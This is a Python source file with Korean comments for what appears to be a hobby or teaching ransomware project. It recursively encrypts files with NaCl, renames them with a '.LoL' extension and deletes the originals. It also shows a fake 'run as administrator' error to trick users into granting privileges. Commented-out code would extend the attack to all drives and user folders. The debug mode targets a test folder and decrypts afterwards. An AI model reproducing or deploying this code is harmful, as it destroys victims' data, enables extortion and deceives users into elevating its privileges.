import ctypes
import threading, pathlib, nacl.utils, tkinter
import os, sys, nacl.secret
from PIL import Image, ImageDraw, ImageFont
from time import sleep
from tkinter import messagebox
from datetime import datetime

    #암호화와 복호화를 수행할 클래스. 파일명을 리스트로 받는다
class EnDecryptor:
    def __init__(self, files=0, encryptModule=0):
        self._files=files
        self._encryptModule=encryptModule

    def encryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return

                    with open(file, "rb") as File:
                        data=File.read()
                    encryptedFile=self._encryptModule.encrypt(data)
                    with open(f"{file}.LoL", "wb") as File:
                        File.write(encryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")

    def decryptFile(self):
        try:
            for file in self._files:
                originName=file.strip(".LoL")
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return

                    with open(file, "rb") as File:
                        data=File.read()
                    decryptedFile=self._encryptModule.decrypt(data)
                    with open(originName, "wb") as File:
                        File.write(decryptedFile)
                    os.remove(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")

    #파이썬 실행 시 인자로 key를 주면 해당 키로 암호화 모듈을 생성하고, 그렇지 않으면 새로이 키를 생성한다.
if len(sys.argv)==1:
    print("키를 랜덤하게 생성합니다")
    Key=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
elif len(sys.argv)==2:
    with open(sys.argv[1], 'rb') as File:
        Key=File.read()
EncryptModule=nacl.secret.SecretBox(Key)
MaxThread=120
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

    #암호화를 진행할 타겟 드라이브 경로 리스트를 생성한다. DEBUG시에는 별도의 경로를 사용한다.
#PathList=[r"C:\Users\\"]
#for letter in range(97, 123):
#    drive=f"{chr(letter)}:\\"
#    if (pathlib.Path(drive).exists()):
#        PathList.append(drive)
#PathList.remove("c:\\")

PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]
#print(f"[DEBUG] PathList: {PathList}")

    #암호화 시작 전, 랜섬웨어에 감염됐다는 메시지를 전달한다.
def changeBackground():
    print("대충 경고메시지를 띄웠다고 치죠")

    #디렉토리별로 재귀적으로 암호화 메서드를 호출한다.
def recursiveEncrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        EnDecryptor(files, EncryptModule).encryptFile()
    for dir in dirs:
        recursiveEncrypt(dir)

    #디렉토리별로 재귀적으로 복호화 메서드를 호출한다.
def recursiveDecrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        EnDecryptor(files, EncryptModule).decryptFile()
    for dir in dirs:
        recursiveDecrypt(dir)

    #Admin계정으로의 접근을 유도한다
def fakeAlert():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try to re-run as administrator")

    #Key를 Binary모드로 저장한다. 저장하는 키의 이름은 프로그램 실행 시점의 시각정보를 포함한다.
def saveKey():
    print("현재 키: ", Key)
    with open(f"key_{datetime.now().strftime('%Y-%m-%d %H-%M-%S')}", "wb") as File:
        File.write(Key)

    #실제 암호화를 실행한다.
if __name__ == '__main__':
    print("Admin여부", IsAdmin)
    saveKey()
    if(IsAdmin==False):#디버그를 위한 강제실행
        changeBackground()
        for drive in PathList_DEBUG:
            print("\n==============================================================================")
            print("***암호화가 5초 뒤 진행될 예정입니다. 타겟디렉토리를 마지막으로 확인하세요***\n", drive)
            print("==============================================================================\n")
            sleep(5)
            recursiveEncrypt(drive)#암호화 수행
            print("암호화 완료. 30초 뒤 복호화를 수행합니다")
            sleep(30)
            recursiveDecrypt(drive)#복호화 수행
            print("복호화 완료")
            
    else:
        fakeAlert()
            
                          
                      
